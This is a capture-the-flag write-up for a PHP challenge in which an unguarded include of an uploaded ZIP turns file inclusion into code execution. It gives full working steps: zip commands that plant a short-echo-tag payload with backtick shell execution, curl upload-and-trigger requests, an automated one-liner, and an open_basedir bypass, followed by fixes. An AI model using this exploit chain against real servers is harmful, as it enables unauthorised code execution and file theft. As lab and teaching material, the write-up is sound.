# The Archivist’s Echo — Writeup (ZIP Archive Comment RCE)

## TL;DR
- The app includes a user-supplied path: `include($file_to_include)`.
- Blacklist misses the PHP short echo tag `<?=`.
- Including a `.zip` makes PHP parse the ZIP archive comment before binary data, so PHP in the comment executes.
- `open_basedir` blocks `readfile('/flag.txt')`, but using PHP backticks executes a shell and bypasses it: `` `cat /flag.txt` ``.

Flag obtained: `Securinets{LFI_to_RCE_via_Z1P_Arch1ve_C0mm3nt_3ch0}`

---

## Source review notes
- Vulnerable include (web/index.php):
  - Accepts `?file=...` with a blacklist that forbids `php://`, `data://`, `zip://`, `expect://`, `file://`, `glob://`, `phar://`, and `<?php`.
  - Does NOT block `<?=` (PHP short echo tag).
  - Calls `@include($file_to_include)` directly.
- Environment (php.ini):
  - `open_basedir = /var/www/html:/tmp` (so `/flag.txt` is outside allowed paths for PHP file functions).
  - Dangerous functions mostly disabled, but shell execution via backticks/system intentionally left available for the challenge.

Effect: If we upload a ZIP and then include it, PHP will evaluate any PHP code in the ZIP’s archive comment. Using backticks lets us read `/flag.txt` despite `open_basedir`.

## Exploitation (manual, Bash)

1) Create a ZIP with a PHP payload in the archive comment (two variants shown):

- Variant A (may be blocked by open_basedir):
```
printf x > t && zip -q p.zip t
printf '%s' '<?=readfile("/flag.txt")?>' | zip -q -z p.zip
```

- Variant B (bypasses open_basedir via shell):
```
printf x > t && zip -q p.zip t
printf '%s' '<?=`cat /flag.txt`?>' | zip -q -z p.zip
```

Optional: verify comment
```
zipinfo -z p.zip
```

2) Upload the archive and note the randomized name in the response HTML
```
BASE='http://localhost:8080'
curl -sS -F 'archiveFile=@p.zip;type=application/zip;filename=p.zip' "$BASE/"
```
Example returned name: `489de4e2aa73b8da19e2fa58e2deae70.zip` (or `987396be1ac82d821dd4ba6678364168.zip`).

3) Trigger the include to execute the ZIP comment
```
NAME='uploads/987396be1ac82d821dd4ba6678364168.zip'   # replace with your returned name
curl -sS "$BASE/?file=$NAME"
```

If Variant B is used, the flag prints within the HTML response. In our run it returned:
```
Securinets{LFI_to_RCE_via_Z1P_Arch1ve_C0mm3nt_3ch0}
```

## One-liner (automated)
```
BASE='http://localhost:8080'; printf x>t && zip -q p.zip t && printf '%s' '<?=`cat /flag.txt`?>' | zip -q -z p.zip && \
NAME=$(curl -sS -F 'archiveFile=@p.zip;type=application/zip;filename=p.zip' "$BASE/" | sed -n 's/.*<code>\([0-9a-f]\{32\}\.zip\)<\/code>.*/\1/p') && \
curl -sS "$BASE/?file=uploads/$NAME"
```

## Root cause and fixes
- Do not include user-supplied paths. If file viewing is required, read as bytes and stream safely; never `include`.
- Replace blacklist with strict allowlists and normalize input paths.
- Disable short open tags or at least block both `<?php` and `<?=`.
- Do not allow including non-PHP formats like ZIP; validate extensions with an allowlist and content-type detection.
- Harden PHP: ensure `exec`, `shell_exec`, `system`, and backticks are unavailable; keep `open_basedir` but don’t rely on it as a sole control.